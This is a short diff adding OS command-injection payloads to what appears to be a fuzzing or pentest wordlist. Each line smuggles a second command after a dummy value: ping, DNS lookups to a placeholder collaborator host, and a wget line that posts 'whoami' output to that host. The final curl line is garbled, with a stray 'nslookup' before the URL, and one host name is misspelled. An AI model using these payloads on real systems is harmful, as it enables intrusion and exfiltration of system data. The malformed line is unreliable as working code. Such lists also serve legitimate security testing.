@@ -85,3 +85,11 @@ test1 ; ping -c 10 127.0.0.1
 test1 & ping -c 10 127.0.0.1
 test1 | ping -c 10 127.0.0.1
 test1 && ping -n 10 127.0.0.1
+
+test1 ; nslookup colloaborator
+test1 ; dig <COLLABORATOR_HOST>
+test1 ; host <COLLABORATOR_HOST>
+
+test1 ; OUTPUT=$(whoami) ; wget --post-data="$OUTPUT" -qO- https://collaborator
+
+test2 ; whoami | curl -X POST --data-binary @- nslookup http://collaborator
